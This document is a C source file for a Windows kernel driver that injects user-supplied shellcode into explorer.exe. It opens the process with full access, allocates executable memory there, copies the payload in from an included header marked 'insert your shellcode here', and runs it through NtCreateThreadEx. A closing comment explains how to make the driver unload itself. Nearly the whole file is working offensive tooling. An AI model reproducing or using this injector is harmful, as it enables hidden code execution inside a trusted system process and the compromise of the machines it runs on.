#include <ntifs.h>
#include <ntimage.h>
#include "getssdt.h"
#include "shellcode.h" // insert your shellcode here
#include "Structure.h"

PVOID orig_NtCreateThreadEx = NULL;

NTSTATUS FindPidByName(WCHAR* processName, ULONG* pid) {
    NTSTATUS status = STATUS_SUCCESS;
    PSYSTEM_PROCESS_INFO originalInfo = NULL;
    PSYSTEM_PROCESS_INFO info = NULL;
    ULONG infoSize = 0;

    if (!pid || !processName)
        return STATUS_INVALID_PARAMETER;

    status = ZwQuerySystemInformation(SystemProcessInformation, NULL, 0, &infoSize);

    while (status == STATUS_INFO_LENGTH_MISMATCH) {
        if (originalInfo)
            ExFreePoolWithTag(originalInfo, DRIVER_TAG);
        originalInfo = (PSYSTEM_PROCESS_INFO)AllocateMemory(infoSize);
        if (!originalInfo)
            break;
        status = ZwQuerySystemInformation(SystemProcessInformation, originalInfo, infoSize, &infoSize);
    }

    if (!NT_SUCCESS(status) || !originalInfo) {
        if (!originalInfo)
            status = STATUS_INSUFFICIENT_RESOURCES;
        else
            ExFreePoolWithTag(originalInfo, DRIVER_TAG);
        return status;
    }

    info = originalInfo;

    while (info->NextEntryOffset) {
        if (info->ImageName.Buffer && info->ImageName.Length > 0) {
            if (_wcsicmp(info->ImageName.Buffer, processName) == 0) {
                *pid = HandleToULong(info->UniqueProcessId);
                break;
            }
        }
        info = (PSYSTEM_PROCESS_INFO)((PUCHAR)info + info->NextEntryOffset);
    }

    if (originalInfo)
        ExFreePoolWithTag(originalInfo, DRIVER_TAG);
    return status;
}


NTSTATUS InjectShellcode(HANDLE hProcess, PVOID shellcode, SIZE_T shellcodeSize) {
    NTSTATUS status;
    PVOID remoteBuffer = NULL;
    SIZE_T size = shellcodeSize;
    PEPROCESS targetProcess = NULL;
    KAPC_STATE apcState;

    unsigned char* plainShellcode = (unsigned char*)shellcode;
    SIZE_T plainShellcodeSize = shellcodeSize;

    status = ZwAllocateVirtualMemory(
        hProcess,
        &remoteBuffer,
        0,
        &plainShellcodeSize,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );
    if (!NT_SUCCESS(status)) {
        return status;
    }

    status = ObReferenceObjectByHandle(
        hProcess,
        PROCESS_ALL_ACCESS,
        *PsProcessType,
        KernelMode,
        (PVOID*)&targetProcess,
        NULL
    );
    if (!NT_SUCCESS(status)) {
        return status;
    }

    KeStackAttachProcess(targetProcess, &apcState);

    SIZE_T bytesCopied = 0;
    status = MmCopyVirtualMemory(PsGetCurrentProcess(), plainShellcode, targetProcess, remoteBuffer, plainShellcodeSize, KernelMode, &bytesCopied);

    KeUnstackDetachProcess(&apcState);
    ObDereferenceObject(targetProcess);

    if (!NT_SUCCESS(status)) return status;

    HANDLE hThread = NULL;
    if (orig_NtCreateThreadEx) {
        status = ((NTSTATUS(NTAPI*)(PHANDLE, ACCESS_MASK, PVOID, HANDLE, PKSTART_ROUTINE, PVOID, ULONG, ULONG, ULONG_PTR, ULONG_PTR, PVOID))orig_NtCreateThreadEx)(
            &hThread,
            THREAD_ALL_ACCESS,
            NULL,
            hProcess,
            (PKSTART_ROUTINE)remoteBuffer,
            NULL,
            FALSE,
            0,
            0,
            0,
            NULL
            );
    }
    else {
        return STATUS_UNSUCCESSFUL;
    }

    if (NT_SUCCESS(status))
        ZwClose(hThread);
    else
        ZwFreeVirtualMemory(hProcess, &remoteBuffer, &plainShellcodeSize, MEM_RELEASE);

    return status;
}

VOID init() {
    GetWindowsVersion();
    NTDLL_Initialize();
}

NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath) {
    UNREFERENCED_PARAMETER(DriverObject);
    UNREFERENCED_PARAMETER(RegistryPath);

    init();

    // finding NtCreateThreadEx in ntdll
    orig_NtCreateThreadEx = GetFunctionAddress("NtCreateThreadEx");
    if (!orig_NtCreateThreadEx) return STATUS_UNSUCCESSFUL;

    HANDLE hProcess = NULL;
    CLIENT_ID clientId;
    OBJECT_ATTRIBUTES objAttributes;
    SIZE_T shellcodeSize = sizeof(shellcode);

    ULONG pid;

    // target process
    FindPidByName(L"explorer.exe", &pid);

    clientId.UniqueProcess = (HANDLE)pid;
    clientId.UniqueThread = NULL;

    InitializeObjectAttributes(&objAttributes, NULL, 0, NULL, NULL);

    NTSTATUS status = ZwOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &objAttributes, &clientId);
    if (!NT_SUCCESS(status)) return status;

    status = InjectShellcode(hProcess, (PVOID)shellcode, shellcodeSize);

    ZwClose(hProcess);

    return NT_SUCCESS(status) ? STATUS_SUCCESS : STATUS_UNSUCCESSFUL;

    // you can do 
    // return STATUS_UNSUCCESSFUL;
    // for auto unloading
}
